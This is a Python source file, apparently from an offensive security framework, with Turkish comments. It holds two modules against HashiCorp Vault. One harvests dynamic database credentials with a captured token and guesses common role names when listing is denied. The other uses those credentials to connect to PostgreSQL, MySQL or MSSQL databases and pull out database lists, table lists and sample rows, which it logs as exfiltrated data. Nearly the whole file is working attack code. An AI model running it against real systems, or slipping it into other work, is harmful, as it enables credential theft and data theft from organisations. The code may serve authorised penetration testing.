from typing import Optional, Dict, Any, List
import requests
import json

from ..context import ExecutionContext
from ..registry import BaseExecutionModule, ExecutionResult, RiskLevel


TIMEOUT = 10

# Veritabanı bağlantıları için opsiyonel bağımlılıklar
try:
    import psycopg2
    PSYCOPG2_AVAILABLE = True
except ImportError:
    PSYCOPG2_AVAILABLE = False

try:
    import pymysql
    PYMYSQL_AVAILABLE = True
except ImportError:
    PYMYSQL_AVAILABLE = False

try:
    import pyodbc
    PYODBC_AVAILABLE = True
except ImportError:
    PYODBC_AVAILABLE = False


class DatabasePivotModule(BaseExecutionModule):
    def __init__(self):
        super().__init__(
            module_id="database_pivot.exploit",
            title="Database Pivot - Connect and Extract Data",
            risk_level=RiskLevel.DESTRUCTIVE,
            description=(
                "Uses harvested database credentials to connect to the target "
                "database and extract schema information, tables, and data. "
                "Supports PostgreSQL, MySQL, and MSSQL."
            ),
            default_enabled=False,
        )

    def can_run(self, context: ExecutionContext) -> bool:
        """Database credential'ları varsa çalışabilir"""
        return bool(
            getattr(context, "vault_addr", None)
            and _has_db_creds(context)
        )

    def execute(self, context: ExecutionContext, params: Optional[dict] = None) -> ExecutionResult:
        if not self.can_run(context):
            return ExecutionResult(
                status="skipped",
                message="Database pivot requires harvested database credentials.",
                evidence={"missing": ["db_credentials"]},
            )

        params = params or {}
        db_type = params.get("db_type", "postgres").lower()
        db_host = params.get("db_host")
        db_port = params.get("db_port")
        db_name = params.get("db_name", "postgres")
        timeout = params.get("timeout", TIMEOUT)

        # Context'ten credential'ları al
        db_creds = _get_db_creds(context)
        if not db_creds:
            return ExecutionResult(
                status="failed",
                message="No database credentials found in context.",
                evidence={"error": "Missing credentials"},
            )

        # İlk credential'ı kullan (veya hepsini dene)
        cred = db_creds[0]
        username = cred.get("username")
        password = cred.get("password")
        if not username or not password:
            return ExecutionResult(
                status="failed",
                message="Invalid database credentials.",
                evidence={"error": "Missing username or password"},
            )

        # Host/Port bilgileri yoksa params'dan al veya varsayılan kullan
        if not db_host:
            db_host = cred.get("host", "localhost")
        if not db_port:
            db_port = cred.get("port", _default_port(db_type))

        print(f"[*] [ACTIVE] Connecting to {db_type} database at {db_host}:{db_port}")

        connection = None
        try:
            # Veritabanına bağlan
            connection = _connect_database(
                db_type, db_host, db_port, db_name, username, password, timeout
            )

            if not connection:
                return ExecutionResult(
                    status="failed",
                    message=f"Cannot connect to {db_type} database.",
                    evidence={
                        "host": db_host,
                        "port": db_port,
                        "database": db_name,
                        "username": username,
                    },
                )

            # Veritabanı bilgilerini topla
            results = {
                "databases": [],
                "tables": [],
                "data": [],
                "schema": {},
            }

            # 1. Veritabanlarını listele
            databases = _list_databases(db_type, connection)
            results["databases"] = databases
            context.add_finding(
                title="HIGH: Database List Retrieved",
                description=f"Found {len(databases)} databases on target.",
                severity="HIGH",
                evidence={"databases": databases[:20]},
            )

            # 2. Tabloları listele (ilk veritabanı için veya belirtilmişse)
            target_db = params.get("target_db") or (databases[0] if databases else db_name)
            if target_db:
                tables = _list_tables(db_type, connection, target_db)
                results["tables"] = {target_db: tables}
                context.add_finding(
                    title="HIGH: Table List Retrieved",
                    description=f"Found {len(tables)} tables in database '{target_db}'.",
                    severity="HIGH",
                    evidence={"database": target_db, "tables": tables[:20]},
                )

                # 3. Veri çek (ilk 5 tablo için)
                max_tables = params.get("max_tables", 5)
                max_rows = params.get("max_rows", 10)
                sample_data = {}
                for table in tables[:max_tables]:
                    data = _read_table_data(db_type, connection, target_db, table, max_rows)
                    if data:
                        sample_data[table] = data
                results["data"] = sample_data

                if sample_data:
                    context.add_finding(
                        title="CRITICAL: Database Data Exfiltrated",
                        description=(
                            f"Exfiltrated {sum(len(v) for v in sample_data.values())} rows "
                            f"from {len(sample_data)} tables in '{target_db}'."
                        ),
                        severity="CRITICAL",
                        evidence={
                            "database": target_db,
                            "tables": list(sample_data.keys()),
                            "total_rows": sum(len(v) for v in sample_data.values()),
                            "sample": sample_data,
                        },
                    )

            return ExecutionResult(
                status="success",
                message=f"Database pivot succeeded. Found {len(databases)} databases.",
                evidence=results,
            )

        except Exception as e:
            return ExecutionResult(
                status="error",
                message=f"Database pivot failed: {str(e)}",
                evidence={"error": str(e)},
            )
        finally:
            if connection:
                try:
                    connection.close()
                except Exception:
                    pass


# ─── VERİTABANI BAĞLANTISI ──────────────────────────────────────────────────


class DatabaseCredentialHarvestModule(BaseExecutionModule):
    def __init__(self):
        super().__init__(
            module_id="database_credential_harvest.dynamic_creds",
            title="Database Credentials Harvest (dynamic)",
            risk_level=RiskLevel.STATE_CHANGING,
            description=(
                "Harvests dynamic database credentials from Vault database mounts."
            ),
            default_enabled=False,
        )

    def can_run(self, context: ExecutionContext) -> bool:
        """Require a Vault address and at least one token (token or captured_token)."""
        return bool(getattr(context, "vault_addr", None))

    def execute(self, context: ExecutionContext, params: Optional[dict] = None) -> ExecutionResult:
        if not getattr(context, "vault_addr", None):
            return ExecutionResult(
                status="skipped",
                message="Missing vault_addr",
                evidence={"missing": ["vault_addr"]},
            )

        if not (getattr(context, "token", None) or getattr(context, "captured_token", None)):
            return ExecutionResult(
                status="skipped",
                message="Missing authentication (token or captured_token)",
                evidence={"missing": ["token or captured_token"]},
            )

        params = params or {}
        timeout = params.get("timeout", TIMEOUT)
        verify_tls = params.get("verify_tls", getattr(context, "verify_tls", True))

        # Prefer captured_token when available
        auth_token = getattr(context, "captured_token", None) or getattr(context, "token", None)
        headers = {"X-Vault-Token": auth_token}
        namespace = params.get("namespace", getattr(context, "namespace", None))
        if namespace:
            headers["X-Vault-Namespace"] = namespace

        try:
            mounts_url = f"{context.vault_addr.rstrip('/')}/v1/sys/mounts"
            resp = requests.get(mounts_url, headers=headers, timeout=timeout, verify=verify_tls)
        except requests.RequestException as e:
            return ExecutionResult(status="error", message=f"Network error: {e}", evidence={"error": str(e)})

        if resp.status_code != 200:
            return ExecutionResult(status="failed", message="Failed to list mounts", evidence={"db_mounts": []})

        mounts = resp.json().get("data", {})
        db_mounts: List[str] = []
        for mount_point, metadata in mounts.items():
            if metadata.get("type") == "database":
                db_mounts.append(mount_point.strip("/"))

        if not db_mounts:
            return ExecutionResult(status="failed", message="No database mounts found", evidence={"db_mounts": []})

        harvested: List[Dict[str, Any]] = []
        total = 0

        for mount in db_mounts:
            # LIST roles under the mount
            list_url = f"{context.vault_addr.rstrip('/')}/v1/{mount}/roles"
            try:
                list_resp = requests.request("LIST", list_url, headers=headers, timeout=timeout, verify=verify_tls)
            except requests.RequestException:
                continue

            if list_resp.status_code != 200:
                # Fallback: try common role names directly when LIST is denied.
                # Many tokens have read on database/creds/* but not list on
                # database/roles, so discovery via LIST fails but direct cred
                # generation still works.
                role_keys = _fallback_role_names(
                    context.vault_addr, mount, headers, timeout, verify_tls
                )
            else:
                role_keys = list_resp.json().get("data", {}).get("keys", [])

            for role in role_keys:
                # Get role metadata
                role_url = f"{context.vault_addr.rstrip('/')}/v1/{mount}/roles/{role}"
                try:
                    role_resp = requests.get(role_url, headers=headers, timeout=timeout, verify=verify_tls)
                except requests.RequestException:
                    role_resp = None

                role_data = {}
                if role_resp and role_resp.status_code == 200:
                    role_data = role_resp.json().get("data", {})

                creation_statements = role_data.get("creation_statements") or []

                # Request dynamic creds for the role
                creds_url = f"{context.vault_addr.rstrip('/')}/v1/{mount}/creds/{role}"
                try:
                    creds_resp = requests.get(creds_url, headers=headers, timeout=timeout, verify=verify_tls)
                except requests.RequestException:
                    creds_resp = None

                if not creds_resp or creds_resp.status_code != 200:
                    continue

                # Many responses include top-level lease_* keys and a 'data' dict
                resp_json = creds_resp.json()
                lease_duration = resp_json.get("lease_duration") or 0
                data_block = resp_json.get("data", {})
                username = data_block.get("username")
                password = data_block.get("password")

                if not username or not password:
                    continue

                high_priv = any(
                    "GRANT ALL" in stmt.upper() or "ALL PRIVILEGES" in stmt.upper()
                    for stmt in creation_statements
                )
                # Fallback: if role metadata was unreadable, guess from role name
                if not high_priv and not creation_statements:
                    high_priv = any(
                        keyword in role.lower()
                        for keyword in ("admin", "dba", "root", "super", "full")
                    )

                cred = {
                    "username": username,
                    "password": password,
                    "role": role,
                    "type": "dynamic",
                    "lease_duration_seconds": lease_duration,
                    "high_privilege": bool(high_priv),
                }

                harvested.append(cred)
                total += 1

                severity = "CRITICAL" if high_priv else "HIGH"
                context.add_finding(
                    title=f"{severity}: Database Credentials Harvested",
                    description=f"Harvested credentials for role '{role}' on mount '{mount}'.",
                    severity=severity,
                    evidence={"credentials": [cred]},
                )

        if not harvested:
            return ExecutionResult(status="failed", message="No credentials harvested", evidence={"db_mounts": db_mounts, "credentials": []})

        evidence = {"total_harvested": total, "credentials": harvested}
        return ExecutionResult(status="success", message=f"Harvested {total} credentials.", evidence=evidence)


# ─── VERİTABANI BAĞLANTISI ──────────────────────────────────────────────────

def _default_port(db_type: str) -> int:
    ports = {
        "postgres": 5432,
        "mysql": 3306,
        "mssql": 1433,
    }
    return ports.get(db_type, 5432)


def _connect_database(db_type, host, port, database, username, password, timeout):
    """Veritabanına bağlan"""
    try:
        if db_type == "postgres":
            if not PSYCOPG2_AVAILABLE:
                raise ImportError("psycopg2 not installed. Run: pip install psycopg2-binary")
            
            conn = psycopg2.connect(
                host=host,
                port=port,
                database=database,
                user=username,
                password=password,
                connect_timeout=timeout,
            )
            return conn

        elif db_type == "mysql":
            if not PYMYSQL_AVAILABLE:
                raise ImportError("pymysql not installed. Run: pip install pymysql")
            
            conn = pymysql.connect(
                host=host,
                port=port,
                database=database,
                user=username,
                password=password,
                connect_timeout=timeout,
            )
            return conn

        elif db_type == "mssql":
            if not PYODBC_AVAILABLE:
                raise ImportError("pyodbc not installed. Run: pip install pyodbc")
            
            conn_str = (
                f"DRIVER={{ODBC Driver 17 for SQL Server}};"
                f"SERVER={host},{port};"
                f"DATABASE={database};"
                f"UID={username};"
                f"PWD={password};"
                f"TrustServerCertificate=yes;"
                f"Connection Timeout={timeout}"
            )
            conn = pyodbc.connect(conn_str)
            return conn

        else:
            raise ValueError(f"Unsupported database type: {db_type}")

    except ImportError as e:
        print(f"[!] Missing dependency: {e}")
        return None
    except Exception as e:
        print(f"[!] Connection failed: {e}")
        return None


# ─── VERİTABANI SORGULARI ────────────────────────────────────────────────────

def _list_databases(db_type, connection):
    """Veritabanlarını listele"""
    cursor = None
    try:
        cursor = connection.cursor()

        if db_type == "postgres":
            cursor.execute("SELECT datname FROM pg_database WHERE datistemplate = false;")
            return [row[0] for row in cursor.fetchall()]

        elif db_type == "mysql":
            cursor.execute("SHOW DATABASES;")
            return [row[0] for row in cursor.fetchall()]

        elif db_type == "mssql":
            cursor.execute("SELECT name FROM sys.databases;")
            return [row[0] for row in cursor.fetchall()]

        return []
    except Exception as e:
        print(f"[!] Failed to list databases: {e}")
        return []
    finally:
        if cursor:
            try:
                cursor.close()
            except Exception:
                pass


def _list_tables(db_type, connection, database):
    """Tabloları listele"""
    cursor = None
    try:
        cursor = connection.cursor()

        if db_type == "postgres":
            cursor.execute(
                "SELECT table_name FROM information_schema.tables "
                "WHERE table_schema = 'public' AND table_type = 'BASE TABLE';"
            )
            return [row[0] for row in cursor.fetchall()]

        elif db_type == "mysql":
            cursor.execute(f"SHOW TABLES FROM `{database}`;")
            return [row[0] for row in cursor.fetchall()]

        elif db_type == "mssql":
            cursor.execute(
                f"SELECT TABLE_NAME FROM {database}.INFORMATION_SCHEMA.TABLES "
                "WHERE TABLE_TYPE = 'BASE TABLE';"
            )
            return [row[0] for row in cursor.fetchall()]

        return []
    except Exception as e:
        print(f"[!] Failed to list tables: {e}")
        return []
    finally:
        if cursor:
            try:
                cursor.close()
            except Exception:
                pass


def _read_table_data(db_type, connection, database, table, max_rows=10):
    """Tablodan veri oku"""
    cursor = None
    try:
        cursor = connection.cursor()

        if db_type == "postgres":
            cursor.execute(f"SELECT * FROM {table} LIMIT {max_rows};")

        elif db_type == "mysql":
            cursor.execute(f"SELECT * FROM `{database}`.`{table}` LIMIT {max_rows};")

        elif db_type == "mssql":
            cursor.execute(f"SELECT TOP {max_rows} * FROM {database}.dbo.{table};")

        columns = [desc[0] for desc in cursor.description] if cursor.description else []
        rows = cursor.fetchall()
        
        # Sonuçları dict listesine çevir
        return [dict(zip(columns, row)) for row in rows]
    except Exception as e:
        print(f"[!] Failed to read table {table}: {e}")
        return []
    finally:
        if cursor:
            try:
                cursor.close()
            except Exception:
                pass


# ─── CONTEXT YARDIMCILARI ────────────────────────────────────────────────────

def _has_db_creds(context):
    """Context'te database credential'ları var mı kontrol et"""
    creds = getattr(context, "db_credentials", None)
    if creds:
        return bool(creds)
    
    # Findings içinde database credential'ları ara
    for finding in getattr(context, "findings", []):
        if "database" in finding.get("title", "").lower():
            return True
    
    return False


def _get_db_creds(context):
    """Context'ten database credential'larını topla"""
    creds = []

    # Doğrudan attribute
    if hasattr(context, "db_credentials"):
        creds.extend(context.db_credentials)

    # Findings'ten topla
    for finding in getattr(context, "findings", []):
        evidence = finding.get("evidence", {})
        if "credentials" in evidence:
            for cred in evidence.get("credentials", []):
                if "username" in cred and "password" in cred:
                    creds.append(cred)

    return creds


def _fallback_role_names(vault_addr, mount, headers, timeout, verify_tls):
    """Try common database role names when LIST on roles is denied.

    Many least-privilege tokens have ``read`` on ``database/creds/*`` but
    not ``list`` on ``database/roles``.  This fallback directly attempts
    credential generation for well-known role names — if the API returns
    credentials (HTTP 200), the role exists and the token can use it.
    """
    import requests as _r
    base_url = vault_addr.rstrip("/")
    mount_path = mount.strip("/")
    common_roles = [
        "app-admin", "app-readonly", "readonly", "admin",
        "fullaccess", "dba", "app", "dev", "readwrite",
    ]
    found = []
    for role in common_roles:
        # Try credential generation directly — tokens with database/creds/*
        # can generate creds even when they cannot list roles or read role metadata.
        url = f"{base_url}/v1/{mount_path}/creds/{role}"
        try:
            resp = _r.get(url, headers=headers, timeout=timeout, verify=verify_tls)
            if resp.status_code == 200:
                found.append(role)
        except _r.RequestException:
            pass
    return found